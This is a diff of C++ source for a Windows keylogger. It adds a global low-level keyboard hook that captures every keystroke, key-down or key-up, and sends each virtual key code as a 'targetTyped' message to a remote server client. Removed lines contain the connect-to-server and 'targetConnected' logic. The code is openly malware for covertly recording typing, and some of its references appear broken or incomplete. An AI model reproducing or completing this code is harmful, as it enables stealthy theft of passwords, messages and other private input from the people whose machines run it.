@@ -2,16 +2,9 @@
 
 
 keylogger::keylogger()
-    : client(&validation_function)
+    : hook(SetWindowsHookExA(WH_KEYBOARD_LL, &keylogger::lowLevelKeyboardProc, NULL, 0)),
+    client(&validation_function)
 {
-    hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger::KeyboardProc, NULL, 0);
-    if (!client.Connect(server_ip, server_port))
-    {
-        std::cout << "COULDNT CONNECT!\n";
-    }
-    kq::message<messageType> msg(messageType::targetConnected);
-    client.Send(msg);
-    std::cout << "Connected!\n";
 
 }
 keylogger::~keylogger()
@@ -24,18 +17,24 @@ keylogger::~keylogger()
     client.Disconnect();
 }
 
-LRESULT CALLBACK keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+void keylogger::handleKeyStroke(DWORD virtualKeyCode, keyStatus status)
+{
+    kq::message<messageType> msg(messageType::targetTyped);
+    msg << virtualKeyCode << status;
+    client.Send(msg);
+}
 
+LRESULT CALLBACK keylogger::lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    static bool caps;
+    
+    if (nCode >= 0 ) {
+        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+        DWORD virtualKeyCode = kbdStruct->vkCode;
+        keyStatus status = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) ? keyStatus::keyDown : keyStatus::keyUp;
+        transKeys.handleKeyStroke(virtualKeyCode, status);
     }
 
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
- keylogger& keylogger::GetInstance()
-{
-    static keylogger instance;
-    return instance;
-}
 
-HHOOK keylogger::keylogger::hook;
